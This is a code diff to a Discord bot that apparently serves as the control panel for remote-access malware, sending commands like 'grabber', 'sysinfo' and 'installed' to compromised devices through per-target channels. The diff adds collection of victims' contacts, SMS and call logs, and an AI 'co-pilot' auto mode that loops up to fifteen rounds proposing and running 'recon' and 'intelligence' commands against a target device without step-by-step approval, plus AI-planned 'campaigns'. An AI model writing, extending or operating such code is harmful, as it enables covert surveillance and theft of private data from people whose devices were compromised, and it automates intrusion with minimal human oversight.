@@ -726,18 +726,80 @@ client.on(Events.InteractionCreate, async (i) => {
     }
 
     // AI Co-Pilot buttons
-    if (i.customId.startsWith('ai_approve_') || i.customId.startsWith('ai_reject_')) {
+    if (i.customId.startsWith('ai_approve_') || i.customId.startsWith('ai_reject_') || i.customId.startsWith('ai_auto_') || i.customId.startsWith('ai_more_') || i.customId.startsWith('ai_stop_') || i.customId.startsWith('ai_summary_') || i.customId.startsWith('ai_campaign_')) {
       const parts = i.customId.split('_')
       const action = parts[1], targetUid = parts.slice(2).join('_')
       if (i.user.id !== targetUid) return i.reply({ content: `${E.warning} Not your session`, ephemeral: true }).catch(() => {})
       const session = aiContext.getSession(guild.id, targetUid)
-      if (!session || !session.pendingProposal) return i.update({ content: `${E.coffin} Session expired`, components: [] }).catch(() => {})
+      if (!session) return i.update({ content: `${E.coffin} No session. Use \`!ai\` first`, components: [] }).catch(() => {})
+
+      // HANDLE: reject
       if (action === 'reject') { aiContext.clearPendingProposal(session); return i.update({ content: `${E.coffin} Rejected`, components: [] }).catch(() => {}) }
-      const proposal = session.pendingProposal
-      aiContext.clearPendingProposal(session)
-      await i.update({ content: `${E.heart} Executing ${proposal.proposedCommands.length} command(s)...`, components: [] }).catch(() => {})
+
+      // HANDLE: stop
+      if (action === 'stop') { session.autoMode = false; aiContext.clearPendingProposal(session); return i.update({ content: `${E.coffin} Stopped`, components: [] }).catch(() => {}) }
+
+      // HANDLE: more ideas
+      if (action === 'more') {
+        await i.update({ content: `${E.tools} Generating alternatives...`, components: [] }).catch(() => {})
+        try {
+          const { response } = await aiCoPilot.generateMoreIdeas(guild.id, targetUid)
+          const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
+          const text = response.analysis ? `**Alternatives:** ${response.analysis}\n\n${cmdList}` : `**Alternatives:**\n${cmdList}`
+          const aiBtns = [
+            ...actionRow(btn(`ai_approve_${targetUid}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${targetUid}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${targetUid}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${targetUid}`, 'REJECT', '❌', 'danger')),
+            ...actionRow(btn(`ai_summary_${targetUid}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${targetUid}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${targetUid}`, 'STOP', '⏹️', 'danger')),
+          ].flat()
+          return i.editReply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: aiBtns }).catch(() => {})
+        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
+      }
+
+      // HANDLE: summary
+      if (action === 'summary') {
+        await i.update({ content: `${E.tools} Generating intelligence report...`, components: [] }).catch(() => {})
+        try {
+          const { response } = await aiCoPilot.generateSummary(guild.id, targetUid)
+          return i.editReply({ ...bloodEmbed(bold('🤖 INTELLIGENCE REPORT'), 'info', response.summary || response.analysis || 'No data gathered'), components: MENU_BTNS }).catch(() => {})
+        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
+      }
+
+      // HANDLE: campaign
+      if (action === 'campaign') {
+        await i.update({ content: `${E.tools} Planning campaign...`, components: [] }).catch(() => {})
+        try {
+          const ctx = aiContext.summarizeDeviceKnowledge(session)
+          const campaign = await campaignManager.createCampaign(guild.id, targetUid, `Full intelligence campaign based on: ${ctx ? ctx.slice(0, 200) : 'unknown device'}`)
+          const plan = await campaignManager.planCampaign(campaign, ctx)
+          const phaseList = plan.phases.map((p, i) => `**Phase ${i + 1}: ${p.name}**${p.requiresApproval ? ' [⚠️]' : ''}\n${p.commands.map(c => `  ┃ \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')}`).join('\n')
+          const text = `**Objective:** ${campaign.objective}\n\n**Analysis:** ${plan.analysis}\n\n**Plan:**\n${phaseList}\n\n**Estimated:** ${plan.estimatedDuration || '?'} | **Risk:** ${(plan.riskLevel || 'medium').toUpperCase()}\n**ID:** \`${campaign.id}\``
+          return i.editReply({ ...bloodEmbed(bold('🤖 CAMPAIGN'), 'warning', text), components: actionRow(btn(`cmp_approve_${targetUid}_${campaign.id}`, 'APPROVE', '✅', 'success'), btn(`cmp_reject_${targetUid}_${campaign.id}`, 'REJECT', '❌', 'danger')) }).catch(() => {})
+        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
+      }
+
+      // HANDLE: approve (execute proposed commands)
+      if (!session.pendingProposal && action !== 'auto') return i.update({ content: `${E.coffin} No pending proposal`, components: [] }).catch(() => {})
+      const proposal = action === 'auto' ? session.pendingProposal : session.pendingProposal
+      if (!proposal || !proposal.proposedCommands?.length) {
+        // In auto mode, if no proposals, try to generate first
+        if (action === 'auto') {
+          const { response } = await aiCoPilot.processRequest(guild.id, targetUid, 'Propose commands to gather intelligence on the target device. Start with recon.')
+          aiContext.setPendingProposal(session, response)
+          if (!response.proposedCommands?.length) return i.update({ content: `${E.coffin} AI proposed nothing`, components: [] }).catch(() => {})
+        } else return i.update({ content: `${E.coffin} No commands to execute`, components: [] }).catch(() => {})
+      }
+
+      // Re-fetch proposal (may have been set by auto-mode init above)
+      const activeProposal = session.pendingProposal
+      if (!activeProposal?.proposedCommands?.length) return i.update({ content: `${E.coffin} Nothing to execute`, components: [] }).catch(() => {})
+
+      const autoMode = action === 'auto'
+      if (!autoMode) aiContext.clearPendingProposal(session)
+      else session.autoMode = true
+
+      await i.update({ content: `${E.heart} ${autoMode ? 'AUTO' : 'Executing'} ${activeProposal.proposedCommands.length} command(s)...`, components: [] }).catch(() => {})
       const results = []
-      for (const pc of proposal.proposedCommands) {
+      for (const pc of activeProposal.proposedCommands) {
+        if (autoMode && !session.autoMode) { results.push('[STOPPED]'); break }
         const cmdName = pc.command.replace(/^!/, '')
         if (cmdName === 'target') {
           await guild.channels.fetch()
@@ -751,6 +813,7 @@ client.on(Events.InteractionCreate, async (i) => {
         const r = await sendCmdLogged(t.channel, cmdName, pc.args || '', i.user.id, i.user.username)
         if (r.ok) {
           results.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\``)
+          aiContext.markCommandExecuted(session, cmdName, pc.args || '')
           const isGrabber = cmdName === 'grabber'
           const response = await collectChannelResponse(t.channel, cmdName, isGrabber ? 120000 : 30000)
           if (response) {
@@ -763,17 +826,71 @@ client.on(Events.InteractionCreate, async (i) => {
           }
         } else results.push(`[FAIL] ${r.err}`)
       }
+
       const resultText = results.join('\n')
       aiContext.addToHistory(session, 'system', `Commands executed:\n${resultText}`)
+
+      // AUTO MODE: loop until ready or stopped
+      if (autoMode) {
+        let iteration = 0
+        const maxIterations = 15
+        let lastResponse
+        while (iteration < maxIterations && session.autoMode) {
+          const followUp = await aiCoPilot.processResults(guild.id, i.user.id, resultText)
+          lastResponse = followUp.response
+          if (followUp.response.ready && followUp.response.summary) {
+            await i.editReply({ content: `${E.heart} AUTO complete! Final report ready.`, components: [] }).catch(() => {})
+            session.autoMode = false
+            aiContext.clearPendingProposal(session)
+            return i.editReply({ ...bloodEmbed(bold('🤖 AI AUTO REPORT'), 'info', `**Summary:**\n${followUp.response.summary}`), components: MENU_BTNS }).catch(() => {})
+          }
+          if (!followUp.response.proposedCommands?.length) break
+          // Execute next batch
+          const nextResults = []
+          for (const pc of followUp.response.proposedCommands) {
+            if (!session.autoMode) { nextResults.push('[STOPPED]'); break }
+            const cmdName = pc.command.replace(/^!/, '')
+            if (cmdName === 'target') continue
+            const t = resolveTarget(guild, targets, i.user.id)
+            if (!t.channel) { nextResults.push(`[SKIP] No target`); continue }
+            const r = await sendCmdLogged(t.channel, cmdName, pc.args || '', i.user.id, i.user.username)
+            if (r.ok) {
+              nextResults.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\``)
+              aiContext.markCommandExecuted(session, cmdName, pc.args || '')
+              const resp = await collectChannelResponse(t.channel, cmdName, 30000)
+              if (resp) nextResults.push(`[RESULT] ${resp.slice(0, 2000)}`)
+            } else nextResults.push(`[FAIL] ${r.err}`)
+            await new Promise(r => setTimeout(r, 1500))
+          }
+          if (nextResults.length) {
+            const nextText = nextResults.join('\n')
+            aiContext.addToHistory(session, 'system', `Auto-executed:\n${nextText}`)
+          }
+          iteration++
+        }
+        session.autoMode = false
+        aiContext.clearPendingProposal(session)
+        const ctx = aiContext.summarizeDeviceKnowledge(session)
+        return i.editReply({ ...bloodEmbed(bold('🤖 AUTO DONE'), 'info', ctx || 'No data gathered'), components: MENU_BTNS }).catch(() => {})
+      }
+
+      // MANUAL MODE: show follow-up
       const followUp = await aiCoPilot.processResults(guild.id, i.user.id, resultText)
       if (followUp.response.ready && followUp.response.summary) {
-        const nextBtns = followUp.response.proposedCommands?.length ? actionRow(btn(`ai_approve_${i.user.id}`, 'EXECUTE NEXT', '▶️', 'success'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger')) : MENU_BTNS
+        const nextBtns = followUp.response.proposedCommands?.length ? [
+          ...actionRow(btn(`ai_approve_${i.user.id}`, 'EXECUTE NEXT', '▶️', 'success'), btn(`ai_auto_${i.user.id}`, 'AUTO', '▶️', 'primary'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger')),
+          ...actionRow(btn(`ai_summary_${i.user.id}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${i.user.id}`, 'CAMPAIGN', '🎯', 'secondary')),
+        ].flat() : MENU_BTNS
         return i.editReply({ ...bloodEmbed(bold('AI REPORT'), 'info', `**✅ EXECUTED**\`\`\`${resultText.slice(0, 1500)}\`\`\`\n**${followUp.response.summary}**`), components: nextBtns }).catch(() => {})
       }
       const cmdList = followUp.response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
       const text = followUp.response.analysis ? `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Analysis:** ${followUp.response.analysis}\n\n**Next:**\n${cmdList}` : `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Next:**\n${cmdList}`
       aiContext.setPendingProposal(session, followUp.response)
-      return i.editReply({ ...bloodEmbed(bold('AI CO-PILOT'), 'warning', text), components: actionRow(btn(`ai_approve_${i.user.id}`, 'APPROVE NEXT', '✅', 'success'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger')) }).catch(() => {})
+      const aiBtns = [
+        ...actionRow(btn(`ai_approve_${i.user.id}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${i.user.id}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${i.user.id}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${i.user.id}`, 'REJECT', '❌', 'danger')),
+        ...actionRow(btn(`ai_summary_${i.user.id}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${i.user.id}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${i.user.id}`, 'STOP', '⏹️', 'danger')),
+      ].flat()
+      return i.editReply({ ...bloodEmbed(bold('AI CO-PILOT'), 'warning', text), components: aiBtns }).catch(() => {})
     }
 
     // Campaign buttons
@@ -974,11 +1091,15 @@ client.on(Events.MessageCreate, async (msg) => {
                   { cmd: 'ip', timeout: 15000 },
                   { cmd: 'sysinfo', timeout: 15000 },
                   { cmd: 'installed', timeout: 30000 },
+                  { cmd: 'contacts', timeout: 30000 },
+                  { cmd: 'sms', timeout: 30000 },
+                  { cmd: 'call_log', timeout: 30000 },
                 ]
                 const gathered = []
                 for (const { cmd, timeout } of gatherCmds) {
                   const r = await sendCmd(t.channel, cmd, '')
                   if (r.ok) {
+                    await new Promise(r => setTimeout(r, 1000))
                     const resp = await collectChannelResponse(t.channel, cmd, timeout)
                     if (resp) {
                       aiContext.updateDeviceKnowledge(session, t.channel.id, cmd, resp.slice(0, 5000))
@@ -998,7 +1119,11 @@ client.on(Events.MessageCreate, async (msg) => {
             if (!response.proposedCommands.length && response.ready) return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'info', response.summary || response.analysis), components: MENU_BTNS })
             const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
             const text = response.analysis ? `**Analysis:** ${response.analysis}\n\n**Proposed:**\n${cmdList}` : `**Proposed:**\n${cmdList}`
-            return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: actionRow(btn(`ai_approve_${uid}`, 'APPROVE', '✅', 'success'), btn(`ai_reject_${uid}`, 'REJECT', '❌', 'danger')) })
+            const aiBtns = [
+              ...actionRow(btn(`ai_approve_${uid}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${uid}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${uid}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${uid}`, 'REJECT', '❌', 'danger')),
+              ...actionRow(btn(`ai_summary_${uid}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${uid}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${uid}`, 'STOP', '⏹️', 'danger')),
+            ].flat()
+            return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: aiBtns })
           } catch (err) {
             console.error(`[AI] ERROR:`, err.message, err.stack?.slice(0, 500))
             return msg.reply(`${E.coffin} AI error: ${err.message} ${E.skull}`)
